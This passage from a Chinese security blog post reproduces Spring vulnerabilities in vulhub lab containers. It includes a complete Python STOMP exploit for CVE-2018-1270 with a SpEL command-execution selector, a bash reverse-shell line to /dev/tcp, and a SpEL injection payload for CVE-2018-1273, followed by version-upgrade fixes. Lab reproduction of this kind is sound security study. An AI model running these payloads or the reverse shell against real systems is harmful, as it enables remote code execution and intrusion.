class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">exploit.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">logging.basicConfig(stream=sys.stdout, level=logging.INFO)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_str</span>(<span class="params">length</span>):</span></span><br><span class="line">    letters = string.ascii_lowercase + string.digits</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choice(letters) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SockJS</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(*args, **kwargs)</span><br><span class="line">        self.base = <span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>/<span class="subst">&#123;random.randint(<span class="number">0</span>, <span class="number">1000</span>)&#125;</span>/<span class="subst">&#123;random_str(<span class="number">8</span>)&#125;</span>&#x27;</span></span><br><span class="line">        self.daemon = <span class="literal">True</span></span><br><span class="line">        self.session = requests.session()</span><br><span class="line">        self.session.headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Referer&#x27;</span>: url,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        self.t = <span class="built_in">int</span>(time.time()*<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        url = <span class="string">f&#x27;<span class="subst">&#123;self.base&#125;</span>/htmlfile?c=_jp.vulhub&#x27;</span></span><br><span class="line">        response = self.session.get(url, stream=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> response.iter_lines():</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">self, command, headers, body=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">        data = [command.upper(), <span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        data.append(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">f&#x27;<span class="subst">&#123;k&#125;</span>:<span class="subst">&#123;v&#125;</span>&#x27;</span> <span class="keyword">for</span> k, v <span class="keyword">in</span> headers.items()]))</span><br><span class="line">        </span><br><span class="line">        data.append(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line">        data.append(body)</span><br><span class="line">        data.append(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">        data = json.dumps([<span class="string">&#x27;&#x27;</span>.join(data)])</span><br><span class="line"></span><br><span class="line">        response = self.session.post(<span class="string">f&#x27;<span class="subst">&#123;self.base&#125;</span>/xhr_send?t=<span class="subst">&#123;self.t&#125;</span>&#x27;</span>, data=data)</span><br><span class="line">        <span class="keyword">if</span> response.status_code != <span class="number">204</span>:</span><br><span class="line">            logging.info(<span class="string">f&quot;send &#x27;<span class="subst">&#123;command&#125;</span>&#x27; data error.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.info(<span class="string">f&quot;send &#x27;<span class="subst">&#123;command&#125;</span>&#x27; data success.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.session.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sockjs = SockJS(<span class="string">&#x27;http://your-ip:8080/gs-guide-websocket&#x27;</span>)</span><br><span class="line">sockjs.start()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sockjs.send(<span class="string">&#x27;connect&#x27;</span>, &#123;</span><br><span class="line">    <span class="string">&#x27;accept-version&#x27;</span>: <span class="string">&#x27;1.1,1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;heart-beat&#x27;</span>: <span class="string">&#x27;10000,10000&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">sockjs.send(<span class="string">&#x27;subscribe&#x27;</span>, &#123;</span><br><span class="line">    <span class="string">&#x27;selector&#x27;</span>: <span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(&#x27;touch /tmp/success&#x27;)&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;sub-0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;destination&#x27;</span>: <span class="string">&#x27;/topic/greetings&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">data = json.dumps(&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;vulhub&#x27;</span>&#125;)</span><br><span class="line">sockjs.send(<span class="string">&#x27;send&#x27;</span>, &#123;</span><br><span class="line">    <span class="string">&#x27;content-length&#x27;</span>: <span class="built_in">len</span>(data),</span><br><span class="line">    <span class="string">&#x27;destination&#x27;</span>: <span class="string">&#x27;/app/hello&#x27;</span></span><br><span class="line">&#125;, data)</span><br></pre></td></tr></table></figure>
+
+<p>3、修改IP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.3.216</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Spring/image-20200822115205128.png" alt="image-20200822115205128"></p>
+<p>4、进入docker系统内查询</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose <span class="built_in">exec</span> spring bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.3.210/3333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/Spring/image-20200822115244849.png" alt="image-20200822115244849"></p>
+<h5 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>升级框架</p>
+<p><strong>Spring Data Commons</strong></p>
+<p>2.0.x的用户升级到2.0.6</p>
+<p>1.13.x的用户升级到1.13.11</p>
+<p><strong>Spring Data REST</strong></p>
+<p>2.x用户升级到2.6.11</p>
+<p>3.x用户升级到3.0.6</p>
+<p><strong>Spring Boot</strong></p>
+<p>1.5.x用户升级到1.5.11</p>
+<p>2.x用户升级到2.0.1</p>
+<h4 id="CVE-2018-1273"><a href="#CVE-2018-1273" class="headerlink" title="CVE-2018-1273"></a>CVE-2018-1273</h4><h5 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。</p>
+<h5 id="影响范围-4"><a href="#影响范围-4" class="headerlink" title="影响范围"></a>影响范围</h5><p> Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)</p>
+<p>Spring Data REST 2.6 - 2.6.10 (Ingalls SR10) </p>
+<p>Spring Data Commons 2.0 to 2.0.5 (Kay SR5) </p>
+<p>Spring Data REST 3.0 - 3.0.5 (Kay SR5) </p>
+<p>及更早的版本也会受到影响</p>
+<h5 id="漏洞原理-4"><a href="#漏洞原理-4" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。</p>
+<h5 id="漏洞条件-4"><a href="#漏洞条件-4" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>无</p>
+<h5 id="漏洞检测-4"><a href="#漏洞检测-4" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.3.219:8080&#x2F;users</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Spring/image-20200824191930432.png" alt="image-20200824191930432"></p>
+<p>2、截获注册请求</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /users?page=&amp;size=<span class="number">5</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">3.219</span>:<span class="number">8080</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.12</span>; rv:<span class="number">79.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">79.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 52</span></span><br><span class="line"><span class="comment">Origin: http://192.168.3.219:8080</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://192.168.3.219:8080/users</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">username=admin&amp;password=admin&amp;repeatedPassword=admin</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Spring/image-20200824192352733.png" alt="image-20200824192352733"></p>
+<p>3、修改POST值</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch /tmp/success&quot;)]=&amp;password=&amp;repeatedPassword=</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Spring/image-20200824192615084.png" alt="image-20200824192615084"></p>
+<p>4、查看文件</p>
+<p><img src="/images/Spring/image-20200824192634219.png" alt="image-20200824192634219"></p>
+<h5 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>官方补丁</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;paper.seebug.org&#x2F;70&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2252</span><br></pre></td></tr></table></figure>
+
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#Spring" >
+    <span class="tag-code">Spring</span>
+  </a>
+
+  <a href="/tags#WebFramework" >
+    <span class="tag-code">WebFramework</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2021/05/18/CVE-2017-15715/">
+        <span class="nav-arrow">← </span>
+        
+          Apache换行
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2022/03/08/CVE-2022-0847/">
+        
+          CVE-2022-0847
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+      <div class="qrcode">
+        <canvas id="share-qrcode"></canvas>
+        <p class="notice">扫描二维码，分享此文章</p>
+      </div>
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">概述</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">环境搭建</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB%E5%AE%9E%E6%88%98"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">漏洞分类实战</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2016-4977"><span class="toc-nav-number">3.1.</span> <span class="toc-nav-text">CVE-2016-4977</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-nav-number">3.1.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-nav-number">3.1.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-nav-number">3.1.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6"><span class="toc-nav-number">3.1.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-nav-number">3.1.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-nav-number">3.1.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2017-4971"><span class="toc-nav-number">3.2.</span> <span class="toc-nav-text">CVE-2017-4971</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-1"><span class="toc-nav-number">3.2.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-1"><span class="toc-nav-number">3.2.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-nav-number">3.2.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-1"><span class="toc-nav-number">3.2.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-1"><span class="toc-nav-number">3.2.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-nav-number">3.2.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2017-8046"><span class="toc-nav-number">3.3.</span> <span class="toc-nav-text">CVE-2017-8046</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-2"><span class="toc-nav-number">3.3.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-2"><span class="toc-nav-number">3.3.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="toc-nav-number">3.3.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-2"><span class="toc-nav-number">3.3.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-2"><span class="toc-nav-number">3.3.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-2"><span class="toc-nav-number">3.3.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2018-1270"><span class="toc-nav-number">3.4.</span> <span class="toc-nav-text">CVE-2018-1270</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-3"><span class="toc-nav-number">3.4.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-3"><span class="toc-nav-number">3.4.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3"><span class="toc-nav-number">3.4.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-3"><span class="toc-nav-number">3.4.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-3"><span class="toc-nav-number">3.4.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-3"><span class="toc-nav-number">3.4.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2018-1273"><span class="toc-nav-number">3.5.</span> <span class="toc-nav-text">CVE-2018-1273</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-4"><span class="toc-nav-number">3.5.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-4"><span class="toc-nav-number">3.5.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-4"><span class="toc-nav-number">3.5.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-4"><span class="toc-nav-number">3.5.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-4"><span class="toc-nav-number">3.5.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-4"><span class="toc-nav-number">3.5.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">参考</span></a></li></ol>
+    
+  </div>
+</aside>
+
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/2021/06/28/Spring漏洞合集/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://www.si1ent.xyz/css/images/logo.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://www.si1ent.xyz/css/images/logo.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+  <script>
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+  </script>
+
+
+
+  <script>
+    var gitmentConfig = "si1ent";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "Spring漏洞合集",
+        owner: "si1ent",
+        repo: "",
+        oauth: {
+          client_id: "",
+          client_secret: ""
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2022 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    </p>
+    <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/?spm=a2c4g.11186623.J_9220772140.115.26b47b3dkZ3BnL#/Integrated/index"><p class="copyright">
+    皖ICP备19004273号-1
+  </p>
+    </a>
+</footer>
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
